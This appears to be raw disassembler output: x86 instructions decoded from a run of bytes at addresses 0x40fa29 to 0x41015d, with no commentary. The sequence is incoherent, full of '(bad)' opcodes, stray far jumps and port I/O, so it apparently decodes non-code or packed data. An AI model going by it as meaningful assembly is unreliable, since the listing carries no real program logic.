  40fa29:	test   al,0x3
  40fa2b:	xchg   ecx,eax
  40fa2c:	adc    dh,BYTE PTR [ecx+0x27]
  40fa2f:	xor    bh,BYTE PTR [eax]
  40fa31:	mov    eax,ds:0x13c711d5
  40fa36:	gs jmp 0x86b3:0x65dfc24e
  40fa3e:	bound  ecx,QWORD PTR [ebp+0x3c]
  40fa41:	into   
  40fa42:	into   
  40fa43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa44:	nop
  40fa45:	or     ecx,edi
  40fa47:	nop
  40fa48:	sub    bl,BYTE PTR [ebp-0x78]
  40fa4b:	pop    ss
  40fa4c:	arpl   WORD PTR [ecx-0x39],si
  40fa4f:	mov    esi,0xeb4f6f06
  40fa54:	fidivr DWORD PTR [ebx+0x3a]
  40fa57:	adc    bl,BYTE PTR ds:[ebx+0x5e897593]
  40fa5e:	inc    ebx
  40fa5f:	xchg   esp,eax
  40fa60:	pop    ebp
  40fa61:	and    eax,0xe9e34209
  40fa66:	or     al,dl
  40fa68:	out    0x5f,eax
  40fa6a:	add    cl,cl
  40fa6c:	loop   0x40f9fe
  40fa6e:	loop   0x40fa27
  40fa70:	jno    0x40fa17
  40fa72:	mul    esi
  40fa74:	test   dl,al
  40fa76:	pushf  
  40fa77:	lahf   
  40fa78:	sti    
  40fa79:	pop    ds
  40fa7a:	(bad)  
  40fa7b:	or     al,0x96
  40fa7d:	cmp    ecx,edi
  40fa7f:	mov    WORD PTR [edi],ds
  40fa81:	fiadd  DWORD PTR [esi+0x11]
  40fa84:	fldcw  WORD PTR es:[ebx]
  40fa87:	adc    eax,0x17f0da2b
  40fa8c:	fisubr DWORD PTR [ebp-0x5d37da37]
  40fa92:	imul   edi,DWORD PTR [ebp+0x5fcaede],0x3005e10c
  40fa9c:	fstp   QWORD PTR [edx+0x828df74]
  40faa2:	add    al,0x92
  40faa4:	jns    0x40fb21
  40faa6:	imul   esp,DWORD PTR [edi-0x37a40518],0x2a
  40faad:	rcr    DWORD PTR [ecx],1
  40faaf:	add    edx,ebp
  40fab1:	cdq    
  40fab2:	mov    ds:0x6942897c,al
  40fab7:	pop    esi
  40fab8:	inc    ebx
  40fab9:	in     eax,0xdc
  40fabb:	rol    DWORD PTR [edx],0xe0
  40fabe:	ficom  WORD PTR [esi-0x55]
  40fac1:	jmp    0x8dc81ed7
  40fac6:	popa   
  40fac7:	rcr    DWORD PTR [ecx-0x5cb81d64],cl
  40facd:	cli    
  40face:	in     al,0xdf
  40fad0:	div    BYTE PTR [ecx-0x75]
  40fad3:	cmp    cl,BYTE PTR [ecx+eiz*4]
  40fad6:	out    dx,al
  40fad7:	mov    ds:0xc7c4a60e,eax
  40fadc:	fld    TBYTE PTR [ecx+0x605406b7]
  40fae2:	xchg   esi,edx
  40fae4:	xor    bl,BYTE PTR [ebp-0x3fc54706]
  40faea:	mov    cl,0x45
  40faec:	(bad)  
  40faed:	aad    0x20
  40faef:	and    dl,BYTE PTR [esi]
  40faf1:	(bad)  
  40faf2:	fidivr DWORD PTR [esi+0x5b]
  40faf5:	xchg   DWORD PTR [ebx],ebx
  40faf7:	sbb    ch,0xf2
  40fafa:	push   0x59
  40fafc:	je     0x40fa83
  40fafe:	mov    bh,0xf
  40fb00:	in     al,dx
  40fb01:	mov    BYTE PTR [edx],ch
  40fb03:	gs in  al,dx
  40fb05:	xor    BYTE PTR [ecx+0x4e350aaf],bl
  40fb0b:	stos   DWORD PTR es:[edi],eax
  40fb0c:	fnstsw WORD PTR [edx-0x22956e30]
  40fb12:	jae    0x40fac0
  40fb14:	adc    DWORD PTR [eax+esi*8+0x65],ebp
  40fb18:	xchg   edx,eax
  40fb19:	pop    ss
  40fb1a:	jle    0x40faf7
  40fb1c:	adc    ecx,edi
  40fb1e:	pop    esp
  40fb1f:	adc    DWORD PTR [ebx+0x17],edx
  40fb22:	mov    esi,0xbade0728
  40fb27:	pop    es
  40fb28:	repnz imul edi,DWORD PTR [edx-0x219d227e],0xe0975af3
  40fb33:	add    al,BYTE PTR [edi+0xe]
  40fb36:	push   esp
  40fb37:	mov    esi,0xe6b6b137
  40fb3c:	mov    al,ds:0x1cd69c5b
  40fb41:	inc    edx
  40fb42:	xchg   edi,eax
  40fb43:	fdiv   QWORD PTR [eax+0x567964e9]
  40fb49:	inc    edx
  40fb4a:	call   0xf492b11a
  40fb4f:	sti    
  40fb50:	sbb    ah,BYTE PTR ds:0x317ceb9
  40fb56:	rcr    BYTE PTR [esi+0x10],0xf8
  40fb5a:	dec    edi
  40fb5b:	sub    BYTE PTR [edx-0x66],cl
  40fb5e:	cmp    BYTE PTR [ebx],bl
  40fb60:	mov    ebx,0xf9409f1d
  40fb65:	add    edx,ebx
  40fb67:	sub    al,0x34
  40fb69:	aaa    
  40fb6a:	retf   
  40fb6b:	loope  0x40fbc6
  40fb6d:	mov    eax,ds:0x202f6f28
  40fb72:	cmp    al,0x47
  40fb74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb75:	and    BYTE PTR [eax-0xc],ah
  40fb78:	xor    eax,0xadb5e521
  40fb7d:	sub    al,BYTE PTR ds:0x6bb4e31e
  40fb83:	dec    ecx
  40fb84:	push   cs
  40fb85:	push   esi
  40fb86:	aam    0x1c
  40fb88:	fidiv  DWORD PTR [eax+0x61]
  40fb8b:	imul   ebp,DWORD PTR gs:0x5bb4db86,0xa6ceb6c3
  40fb96:	sub    al,0x6b
  40fb98:	mov    edx,0xe1d196ed
  40fb9d:	inc    eax
  40fb9e:	push   0xffffff9f
  40fba0:	and    ah,BYTE PTR [esp+ebp*1+0x173c046f]
  40fba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fba8:	pop    ebp
  40fba9:	arpl   bp,di
  40fbab:	cmp    cl,BYTE PTR [edx+0x28]
  40fbae:	xchg   ebx,eax
  40fbaf:	inc    eax
  40fbb0:	daa    
  40fbb1:	mov    cl,0xe3
  40fbb3:	sti    
  40fbb4:	les    edi,FWORD PTR [edx]
  40fbb6:	mov    al,0xeb
  40fbb8:	sub    eax,0x40fa757a
  40fbbd:	std    
  40fbbe:	xor    al,0x48
  40fbc0:	std    
  40fbc1:	call   0xcd7e0609
  40fbc6:	mov    ah,0x8c
  40fbc8:	jecxz  0x40fc37
  40fbca:	push   ds
  40fbcb:	fs addr16 push cs
  40fbce:	es int3 
  40fbd0:	and    eax,0xa23f78e9
  40fbd5:	xor    al,0x26
  40fbd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd8:	xchg   esi,eax
  40fbd9:	(bad)  
  40fbda:	fcmovbe st,st(4)
  40fbdc:	push   edx
  40fbdd:	aad    0xb5
  40fbdf:	mov    dh,0xda
  40fbe1:	loopne 0x40fbe9
  40fbe3:	fdivp  st(5),st
  40fbe5:	js     0x40fc65
  40fbe7:	ins    DWORD PTR es:[edi],dx
  40fbe8:	loope  0x40fb83
  40fbea:	dec    ebp
  40fbeb:	or     DWORD PTR [edi],0xffffff90
  40fbee:	ror    al,1
  40fbf0:	aas    
  40fbf1:	xchg   esi,eax
  40fbf2:	test   eax,0x81b8e0e7
  40fbf7:	hlt    
  40fbf8:	pop    es
  40fbf9:	or     BYTE PTR [edi],dl
  40fbfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbfc:	outs   dx,DWORD PTR ds:[esi]
  40fbfd:	pop    esp
  40fbfe:	or     eax,0xb98f0029
  40fc03:	xor    DWORD PTR [ebp-0x39],esp
  40fc06:	test   DWORD PTR [esi+0x110f3915],ebp
  40fc0c:	xchg   esp,eax
  40fc0d:	pop    ebx
  40fc0e:	fs xchg cl,dl
  40fc11:	jns    0x40fc67
  40fc13:	call   0x7d22:0xcada7ca2
  40fc1a:	mov    ah,0x6a
  40fc1c:	dec    edx
  40fc1d:	jns    0x40fc71
  40fc1f:	or     eax,DWORD PTR [edx+0xc]
  40fc22:	xlat   BYTE PTR ds:[ebx]
  40fc23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc24:	sub    eax,0x38f2958d
  40fc29:	mov    ds:0x4872337e,eax
  40fc2e:	inc    esp
  40fc2f:	sub    DWORD PTR [edx+0x53],esp
  40fc32:	pop    ebx
  40fc33:	dec    esi
  40fc34:	les    esp,FWORD PTR [edx]
  40fc36:	jmp    0x40fc81
  40fc38:	xchg   esp,eax
  40fc39:	xchg   ebp,eax
  40fc3a:	sbb    eax,0xf34ead1
  40fc3f:	call   0xba2720c5
  40fc44:	xor    dh,bh
  40fc46:	sbb    al,0x77
  40fc48:	xor    BYTE PTR [edx-0x5a],dh
  40fc4b:	(bad)  [esi-0x536edc3]
  40fc51:	daa    
  40fc52:	mov    eax,ds:0xac98aa97
  40fc57:	xchg   DWORD PTR [esi],edi
  40fc59:	jns    0x40fcc9
  40fc5b:	xor    dl,BYTE PTR ds:0x8e70f89a
  40fc61:	pop    esp
  40fc62:	hlt    
  40fc63:	mov    ss,WORD PTR [ebx]
  40fc65:	pop    ebp
  40fc66:	pop    edx
  40fc67:	sbb    BYTE PTR [ebp+0x5a],bl
  40fc6a:	push   ds
  40fc6b:	test   eax,0x68201c7f
  40fc70:	jbe    0x40fc67
  40fc72:	ror    BYTE PTR [ecx+0x8],cl
  40fc75:	inc    edx
  40fc76:	add    BYTE PTR [eax],0x7b
  40fc79:	into   
  40fc7a:	imul   edi,DWORD PTR [edi],0xffffffd7
  40fc7d:	add    bh,cl
  40fc7f:	addr16 cmp dl,ah
  40fc82:	jge    0x40fc41
  40fc84:	push   edi
  40fc85:	hlt    
  40fc86:	test   BYTE PTR [ebp+ecx*2-0x485d1638],dl
  40fc8d:	mov    al,ds:0x68ae0763
  40fc92:	cmc    
  40fc93:	daa    
  40fc94:	cdq    
  40fc95:	outs   dx,DWORD PTR ds:[esi]
  40fc96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc97:	arpl   si,dx
  40fc99:	aam    0x27
  40fc9b:	xor    al,0x49
  40fc9d:	mov    bh,0x35
  40fc9f:	xchg   edx,eax
  40fca0:	inc    ecx
  40fca1:	jbe    0x40fcea
  40fca3:	cdq    
  40fca4:	loopne 0x40fca4
  40fca6:	push   0x6a
  40fca8:	clc    
  40fca9:	stc    
  40fcaa:	rcl    ch,0xe2
  40fcad:	jb     0x40fc45
  40fcaf:	lods   al,BYTE PTR ds:[esi]
  40fcb0:	sbb    al,0x5b
  40fcb2:	xchg   ebp,eax
  40fcb3:	jmp    0x13dc:0x90b8aba6
  40fcba:	leave  
  40fcbb:	loope  0x40fc54
  40fcbd:	fs es pusha 
  40fcc0:	aad    0xd6
  40fcc2:	and    eax,0xa89ff30a
  40fcc7:	lahf   
  40fcc8:	mov    al,ds:0x459c64b7
  40fccd:	push   ds
  40fcce:	jg     0x40fca4
  40fcd0:	ss dec ebp
  40fcd2:	cmp    eax,0xeb6f5ca9
  40fcd7:	lahf   
  40fcd8:	fdivr  DWORD PTR [esi]
  40fcda:	sbb    eax,0xa84f5159
  40fcdf:	and    DWORD PTR [ebp+0x59],eax
  40fce2:	dec    esi
  40fce3:	jnp    0x40fc76
  40fce5:	outs   dx,DWORD PTR ds:[esi]
  40fce6:	mov    al,gs:0x43405257
  40fcec:	push   esp
  40fced:	sbb    DWORD PTR [edi],ecx
  40fcef:	adc    BYTE PTR [edx],dl
  40fcf1:	scas   eax,DWORD PTR es:[edi]
  40fcf2:	adc    al,0x1a
  40fcf4:	sbb    BYTE PTR [eax+0x5],al
  40fcf7:	push   esi
  40fcf8:	in     eax,dx
  40fcf9:	pop    edx
  40fcfa:	ins    DWORD PTR es:[edi],dx
  40fcfb:	inc    edi
  40fcfc:	shl    BYTE PTR [ebp-0x2146a8f3],1
  40fd02:	loopne 0x40fcdd
  40fd04:	jle    0x40fcfd
  40fd06:	icebp  
  40fd07:	test   al,0x60
  40fd09:	or     ah,BYTE PTR [edi]
  40fd0b:	rcl    dh,cl
  40fd0d:	dec    esi
  40fd0e:	aam    0x3e
  40fd10:	xchg   ebx,eax
  40fd11:	(bad)  
  40fd12:	gs fwait
  40fd14:	sti    
  40fd15:	stos   BYTE PTR es:[edi],al
  40fd16:	(bad)  
  40fd17:	jle    0x40fcbe
  40fd19:	(bad)  
  40fd1a:	int3   
  40fd1b:	gs adc cl,ah
  40fd1e:	mov    ebp,0x9a49016b
  40fd23:	inc    ebx
  40fd24:	rcl    DWORD PTR [ecx],cl
  40fd26:	jg     0x40fd41
  40fd28:	rcl    BYTE PTR [ebx+edx*1],0x5
  40fd2c:	xor    esi,DWORD PTR [ebx+0x13bc7f81]
  40fd32:	sub    edi,DWORD PTR [edx]
  40fd34:	and    bl,BYTE PTR [edi-0x1dee0b30]
  40fd3a:	out    dx,al
  40fd3b:	xchg   edx,eax
  40fd3c:	or     BYTE PTR [edx],dh
  40fd3e:	cmp    eax,0x55568237
  40fd43:	mov    edx,0x4c97406f
  40fd48:	outs   dx,BYTE PTR ds:[esi]
  40fd49:	lods   eax,DWORD PTR ds:[esi]
  40fd4a:	xor    BYTE PTR [eax],dh
  40fd4c:	fs out 0xbf,eax
  40fd4f:	jge    0x40fd2d
  40fd51:	rol    edx,0xeb
  40fd54:	add    bl,dl
  40fd56:	pop    eax
  40fd57:	imul   esi,DWORD PTR [ebx],0x4
  40fd5a:	jmp    0x40fcf5
  40fd5c:	pop    edi
  40fd5d:	jbe    0x40fcf6
  40fd5f:	mov    cl,0x43
  40fd61:	mov    cl,0x9
  40fd63:	jle    0x40fd40
  40fd65:	retf   0xf45
  40fd68:	jnp    0x40fd4a
  40fd6a:	cmp    eax,0x5397f9c5
  40fd6f:	lods   eax,DWORD PTR ds:[esi]
  40fd70:	mov    WORD PTR [esp+ecx*1],es
  40fd73:	mov    es,WORD PTR [esi+0x5f266048]
  40fd79:	idiv   al
  40fd7b:	aad    0x69
  40fd7d:	cwde   
  40fd7e:	sub    edx,DWORD PTR [ebx+ebp*1]
  40fd81:	jl     0x40fda8
  40fd83:	jnp    0x40fdea
  40fd85:	test   DWORD PTR [ebp-0x7b],edx
  40fd88:	sbb    cl,BYTE PTR [eax-0x752e63c3]
  40fd8e:	pop    edx
  40fd8f:	loop   0x40fd3a
  40fd91:	mov    ebp,?
  40fd93:	mov    bl,0xfb
  40fd95:	sbb    eax,DWORD PTR [ebx-0x2d9d0d23]
  40fd9b:	es mov dl,0x52
  40fd9e:	jecxz  0x40fe0a
  40fda0:	nop
  40fda1:	xchg   ebp,eax
  40fda2:	pop    es
  40fda3:	popf   
  40fda4:	ins    DWORD PTR es:[edi],dx
  40fda5:	mul    DWORD PTR [edx+0x62]
  40fda8:	sbb    bh,cl
  40fdaa:	enter  0x8d50,0x5f
  40fdae:	or     ch,BYTE PTR [ebp-0x18bc7e91]
  40fdb4:	adc    BYTE PTR [ecx],bl
  40fdb6:	(bad)
  40fdb9:	in     al,0xd6
  40fdbb:	in     al,dx
  40fdbc:	add    DWORD PTR [esi-0x7b],0x93fd2272
  40fdc3:	aad    0xe7
  40fdc5:	lods   al,BYTE PTR ds:[esi]
  40fdc6:	jb     0x40fd96
  40fdc8:	pop    esi
  40fdc9:	hlt    
  40fdca:	mov    ecx,edx
  40fdcc:	xchg   BYTE PTR [esi],ch
  40fdce:	aad    0x4c
  40fdd0:	jecxz  0x40fdb8
  40fdd2:	pop    eax
  40fdd3:	bound  esp,QWORD PTR [ebx+0x1423b213]
  40fdd9:	fnstcw WORD PTR [eax-0x56377dd2]
  40fddf:	ror    DWORD PTR [ebx],1
  40fde1:	ficomp DWORD PTR [ebx-0x8]
  40fde4:	popa   
  40fde5:	scas   eax,DWORD PTR es:[edi]
  40fde6:	xor    eax,0x7a0e8d49
  40fdeb:	inc    edi
  40fdec:	xlat   BYTE PTR ds:[ebx]
  40fded:	xchg   ebx,eax
  40fdee:	adc    edi,DWORD PTR [ecx+0x2c]
  40fdf1:	add    eax,0xa8405718
  40fdf6:	mov    fs,WORD PTR [eax+eiz*1+0x14]
  40fdfa:	aas    
  40fdfb:	sbb    eax,0x2a264bce
  40fe00:	sbb    al,0x82
  40fe02:	dec    esi
  40fe03:	jbe    0x40fe3e
  40fe05:	mov    esp,0x11cb8dad
  40fe0a:	push   ebp
  40fe0b:	sahf   
  40fe0c:	mov    al,ds:0xf7779c1e
  40fe11:	push   ecx
  40fe12:	adc    eax,0xac6de65f
  40fe17:	cmp    al,0xd7
  40fe19:	mov    bl,0x67
  40fe1b:	adc    bl,BYTE PTR [edi-0x15]
  40fe1e:	fst    st(2)
  40fe20:	sub    bh,BYTE PTR [ecx]
  40fe22:	jns    0x40fe16
  40fe24:	(bad)
  40fe27:	and    ch,BYTE PTR [ecx]
  40fe29:	mov    dh,0x90
  40fe2b:	mov    dl,0x38
  40fe2d:	xor    ch,BYTE PTR [ebx+0x3c700503]
  40fe33:	fdivr  st(3),st
  40fe35:	cmp    BYTE PTR [ebx-0xa],0x34
  40fe39:	adc    DWORD PTR [edx+eax*2],eax
  40fe3c:	xor    DWORD PTR [edx],esi
  40fe3e:	retf   0x47d5
  40fe41:	popa   
  40fe42:	xchg   esi,eax
  40fe43:	shl    al,cl
  40fe45:	call   0xc78b:0x6c1532e1
  40fe4c:	int3   
  40fe4d:	enter  0xedd7,0xc1
  40fe51:	xchg   ebx,eax
  40fe52:	rcl    BYTE PTR [eax+edi*8-0x7d],1
  40fe56:	jae    0x40fed5
  40fe58:	and    ebx,DWORD PTR [ecx]
  40fe5a:	imul   ebp,DWORD PTR [eax],0x63
  40fe5d:	gs out 0x47,ax
  40fe61:	jo     0x40fe83
  40fe63:	xor    al,0xc9
  40fe65:	hlt    
  40fe66:	je     0x40fe85
  40fe68:	leave  
  40fe69:	aam    0xb0
  40fe6b:	xchg   ecx,eax
  40fe6c:	adc    eax,0xfcadceb3
  40fe71:	(bad)  
  40fe72:	(bad)  
  40fe73:	jle    0x40fe69
  40fe75:	pop    es
  40fe76:	sub    eax,0x758d59f0
  40fe7b:	lds    esp,FWORD PTR [edx]
  40fe7d:	(bad)  
  40fe7e:	dec    ecx
  40fe7f:	lods   eax,DWORD PTR ds:[esi]
  40fe80:	loope  0x40fefe
  40fe82:	xor    ecx,edx
  40fe84:	cmp    eax,0x2f2d8ee
  40fe89:	jnp    0x40fef3
  40fe8b:	mov    ebx,0x15eaa21
  40fe90:	lea    ebp,[eax]
  40fe92:	cmp    DWORD PTR ds:0x997e6049,0xffffffdb
  40fe99:	addr16 pop ss
  40fe9b:	push   0xffffffd3
  40fe9d:	out    0x59,al
  40fe9f:	int3   
  40fea0:	pop    ebx
  40fea1:	pop    eax
  40fea2:	fs retf 
  40fea4:	sbb    al,0x48
  40fea6:	adc    DWORD PTR [ebp+0x4432eb88],edx
  40feac:	mov    cl,0xf5
  40feae:	fbstp  TBYTE PTR [esi]
  40feb0:	pop    ecx
  40feb1:	rol    ecx,1
  40feb3:	mov    al,0x0
  40feb5:	and    al,bl
  40feb7:	jge    0x40fea6
  40feb9:	and    BYTE PTR [eax],cl
  40febb:	call   0x8617c94d
  40fec0:	jecxz  0x40fe4e
  40fec2:	aam    0xa2
  40fec4:	fwait
  40fec5:	and    BYTE PTR [esp+eiz*4],bh
  40fec8:	xor    dh,BYTE PTR [ebx*1-0x3187ba4e]
  40fecf:	out    0x57,al
  40fed1:	scas   al,BYTE PTR es:[edi]
  40fed2:	sub    BYTE PTR [esi],al
  40fed4:	idiv   DWORD PTR [edx+0x5e320186]
  40feda:	xchg   edx,eax
  40fedb:	add    BYTE PTR [ebx+ebp*1-0x35763bd8],bl
  40fee2:	adc    eax,0xf3eb195f
  40fee7:	sbb    BYTE PTR [edi-0x2e61f400],ch
  40feed:	and    BYTE PTR [ebx+0x4e671a0],al
  40fef3:	mov    esp,0x147dc793
  40fef8:	ins    DWORD PTR es:[edi],dx
  40fef9:	mov    cs,WORD PTR [ecx+0x28]
  40fefc:	ins    BYTE PTR es:[edi],dx
  40fefd:	cmp    al,0x16
  40feff:	or     BYTE PTR [eax+edi*1+0x50],dh
  40ff03:	test   DWORD PTR [eax+0x22],ebp
  40ff06:	dec    eax
  40ff07:	not    DWORD PTR [edx+0x2a]
  40ff0a:	stos   DWORD PTR es:[edi],eax
  40ff0b:	gs push eax
  40ff0d:	sub    al,dh
  40ff0f:	xor    ebx,DWORD PTR [edx-0x7b]
  40ff12:	mov    esi,0xe4e3b185
  40ff17:	lods   eax,DWORD PTR ds:[esi]
  40ff18:	xchg   DWORD PTR [ebp-0x57],ebp
  40ff1b:	aam    0xd2
  40ff1d:	inc    ecx
  40ff1e:	adc    esi,DWORD PTR es:[edx]
  40ff21:	inc    al
  40ff23:	push   esi
  40ff24:	neg    edx
  40ff26:	ins    DWORD PTR es:[edi],dx
  40ff27:	mov    ds:0xdcaff05b,al
  40ff2c:	jae    0x40fec3
  40ff2e:	pop    ebp
  40ff2f:	push   0xc1e1c9fc
  40ff34:	outs   dx,BYTE PTR ds:[esi]
  40ff35:	ins    DWORD PTR es:[edi],dx
  40ff36:	leave  
  40ff37:	add    eax,0x2491a7fc
  40ff3c:	aam    0x9d
  40ff3e:	and    ch,ah
  40ff40:	pop    ebp
  40ff41:	sbb    al,0xa
  40ff43:	lea    ecx,[esi+ebx*4]
  40ff46:	add    al,0x91
  40ff48:	pop    eax
  40ff49:	pop    edi
  40ff4a:	imul   DWORD PTR [edi+0x11]
  40ff4d:	fisttp DWORD PTR [eax]
  40ff4f:	mov    bl,BYTE PTR ds:0x8cad5cf5
  40ff55:	pop    edx
  40ff56:	pop    es
  40ff57:	and    eax,DWORD PTR [eax-0x3a54103]
  40ff5d:	inc    ecx
  40ff5e:	sbb    bh,bh
  40ff60:	push   ebp
  40ff61:	fwait
  40ff62:	arpl   WORD PTR [ecx+0x4b852d41],bp
  40ff68:	jmp    0x40ff17
  40ff6a:	mov    ebp,0xc8e23bd
  40ff6f:	xor    DWORD PTR [ecx-0x3d],edi
  40ff72:	adc    al,0x25
  40ff74:	cmp    eax,DWORD PTR [ebx+ebp*8]
  40ff77:	cmp    eax,0x25952211
  40ff7c:	mov    ecx,0x256ab331
  40ff81:	or     ah,BYTE PTR [esi-0x4ec2727c]
  40ff87:	pushf  
  40ff88:	scas   al,BYTE PTR es:[edi]
  40ff89:	add    dh,bl
  40ff8b:	and    al,0x31
  40ff8d:	mov    ds:0xb67d2b17,eax
  40ff92:	jmp    0x879c:0x6b85fdbc
  40ff99:	mov    esi,0xb4a86d87
  40ff9e:	mov    al,0x20
  40ffa0:	clc    
  40ffa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffa2:	test   al,0x17
  40ffa4:	outs   dx,BYTE PTR ds:[esi]
  40ffa5:	stos   BYTE PTR es:[edi],al
  40ffa6:	ret    
  40ffa7:	cmp    edx,esp
  40ffa9:	sub    dl,cl
  40ffab:	adc    DWORD PTR [ebx],ebx
  40ffad:	retf   0xd4d9
  40ffb0:	push   ds
  40ffb1:	hlt    
  40ffb2:	shl    BYTE PTR ds:0x17d9668c,cl
  40ffb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffb9:	mov    al,ds:0x919f3dd1
  40ffbe:	jle    0x40ff5c
  40ffc0:	test   al,0x86
  40ffc2:	int3   
  40ffc3:	inc    ebx
  40ffc4:	mov    ch,0x8d
  40ffc6:	loopne 0x40ffae
  40ffc8:	cmp    DWORD PTR [ebx+0x5a],edx
  40ffcb:	push   0xe68a9af5
  40ffd0:	jg     0x410033
  40ffd2:	pushf  
  40ffd3:	ss aam 0x3f
  40ffd6:	cs stc 
  40ffd8:	pop    ds
  40ffd9:	sbb    cl,BYTE PTR es:[ebp+0x17]
  40ffdd:	mov    ds:0x66e67961,eax
  40ffe2:	sti    
  40ffe3:	mov    ds:0x76f4f8e9,eax
  40ffe8:	inc    ebx
  40ffe9:	sbb    DWORD PTR [ebp+0x61f8e664],esi
  40ffef:	pop    esp
  40fff0:	daa    
  40fff1:	leave  
  40fff2:	lds    eax,FWORD PTR [edi]
  40fff4:	imul   esi,DWORD PTR [ecx+0x11],0xab8c5331
  40fffb:	inc    eax
  40fffc:	ins    DWORD PTR es:[edi],dx
  40fffd:	xchg   edx,eax
  40fffe:	stos   DWORD PTR es:[edi],eax
  40ffff:	mov    esp,0x54586154
  410004:	fisub  DWORD PTR [edx-0x26]
  410007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410008:	sub    dh,BYTE PTR [ecx]
  41000a:	fisubr WORD PTR [ecx]
  41000c:	jge    0x40fffb
  41000e:	dec    esi
  41000f:	outs   dx,DWORD PTR ds:[esi]
  410010:	ds xor al,0xee
  410013:	aad    0xa0
  410015:	clc    
  410016:	iret   
  410017:	inc    ebp
  410018:	es push ds
  41001a:	ret    0x84a0
  41001d:	and    DWORD PTR ds:0x450acecb,ebp
  410023:	or     BYTE PTR [ecx],dh
  410025:	xor    al,0x9b
  410027:	mov    dl,0x5f
  410029:	sahf   
  41002a:	dec    ebp
  41002b:	xchg   cl,bh
  41002d:	(bad)  
  41002e:	sbb    esp,DWORD PTR [ebp-0x32b508b]
  410034:	jg     0x410033
  410036:	inc    edx
  410037:	lods   eax,DWORD PTR ds:[esi]
  410038:	idiv   DWORD PTR [edi+esi*4+0x67057be9]
  41003f:	shl    BYTE PTR [ecx+edx*8],0x2
  410043:	das    
  410044:	js     0x4100b1
  410046:	fcmovnb st,st(3)
  410048:	dec    ecx
  410049:	xor    DWORD PTR [eax+ecx*2],eax
  41004c:	jecxz  0x410086
  41004e:	adc    ebx,esi
  410050:	xchg   esp,eax
  410051:	sbb    al,0x63
  410053:	add    DWORD PTR [edx-0x48],ebx
  410056:	(bad)  [esi+0x1e043d36]
  41005d:	pop    esi
  41005e:	fnstsw WORD PTR [edx-0x5f]
  410061:	in     eax,0xcd
  410063:	fwait
  410064:	add    al,0x95
  410066:	out    dx,eax
  410067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410068:	pop    edx
  410069:	inc    ebp
  41006a:	int    0xd5
  41006c:	aas    
  41006d:	mov    ah,0x6e
  41006f:	xchg   esi,eax
  410070:	or     cl,BYTE PTR [esi]
  410072:	adc    al,0xb6
  410074:	jb     0x410045
  410076:	icebp  
  410077:	test   al,0x9c
  410079:	rol    DWORD PTR [esi],cl
  41007b:	or     DWORD PTR [eax+0x7d],eax
  41007e:	out    dx,eax
  41007f:	sbb    DWORD PTR [eax+0x56],edi
  410082:	and    eax,0x62c2c902
  410087:	shl    DWORD PTR [edx-0x65],1
  41008a:	lods   al,BYTE PTR ds:[esi]
  41008b:	into   
  41008c:	mov    DWORD PTR [ebx-0x2b],esp
  41008f:	push   esp
  410090:	xor    al,0xe2
  410092:	push   ss
  410093:	(bad)  
  410094:	arpl   WORD PTR [ebp-0x43f69691],ax
  41009a:	add    al,0x9c
  41009c:	cdq    
  41009d:	inc    edx
  41009e:	pop    ds
  41009f:	jbe    0x410026
  4100a1:	dec    ebp
  4100a2:	aad    0xeb
  4100a4:	sahf   
  4100a5:	clc    
  4100a6:	cmp    edx,eax
  4100a8:	mov    eax,ds:0x66f90b7f
  4100ad:	outs   dx,BYTE PTR ds:[esi]
  4100ae:	cmc    
  4100af:	mov    dh,0xd2
  4100b1:	and    DWORD PTR [edx+0x8],ebp
  4100b4:	jbe    0x41007d
  4100b6:	jle    0x410088
  4100b8:	mov    cl,0x89
  4100ba:	sub    al,0x8a
  4100bc:	adc    dl,BYTE PTR [esi-0x26]
  4100bf:	and    eax,0xa5b65a3d
  4100c4:	inc    ebp
  4100c5:	not    BYTE PTR ds:0x34577ebb
  4100cb:	jno    0x410079
  4100cd:	jecxz  0x4100ea
  4100cf:	test   eax,eax
  4100d1:	ja     0x4100cf
  4100d3:	sub    eax,0x19b31b76
  4100d8:	or     al,0x13
  4100da:	jb     0x4100a6
  4100dc:	sub    al,0xcd
  4100de:	jo     0x410121
  4100e0:	adc    al,0xcf
  4100e2:	or     eax,0xbd0ff036
  4100e7:	jle    0x410157
  4100e9:	inc    ecx
  4100ea:	ficom  DWORD PTR [eax+0x6049e53c]
  4100f0:	inc    esp
  4100f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f2:	jle    0x410094
  4100f4:	push   0xffffff96
  4100f6:	rol    BYTE PTR [esi],cl
  4100f8:	pop    ds
  4100f9:	push   ebp
  4100fa:	inc    ecx
  4100fb:	ror    BYTE PTR [esi+0x3690736],0x7c
  410102:	aam    0x99
  410104:	mov    dl,0x53
  410106:	gs xchg esi,eax
  410108:	popf   
  410109:	retf   0xbc33
  41010c:	ja     0x4100f4
  41010e:	sti    
  41010f:	jmp    0x410166
  410111:	pop    ebx
  410112:	pop    esi
  410113:	cli    
  410114:	and    esp,DWORD PTR [ebx]
  410116:	inc    esp
  410117:	mov    edx,0x929e48ee
  41011c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41011d:	ror    WORD PTR ds:0xe7bedf76,0x78
  410125:	int    0xce
  410127:	add    ch,ah
  410129:	xchg   edi,eax
  41012a:	shl    BYTE PTR [edx+0x7e],1
  41012d:	mov    ch,0x9
  41012f:	xor    BYTE PTR [ebp+edx*2-0x48],0x0
  410134:	ja     0x410173
  410136:	fdivr  QWORD PTR [ebx+0x6c92cf84]
  41013c:	xchg   ebx,eax
  41013d:	push   0xe0a920d
  410142:	xchg   edx,eax
  410143:	mov    esp,0xbe410f44
  410148:	inc    ebp
  410149:	jns    0x4100eb
  41014b:	dec    edi
  41014c:	xchg   esp,eax
  41014d:	cdq    
  41014e:	sti    
  41014f:	mov    esp,0xc8e1b321
  410154:	push   cs
  410155:	fsub   DWORD PTR [ebp-0x10d21e95]
  41015b:	xor    dl,BYTE PTR [esi]
  41015d:	in     al,dx
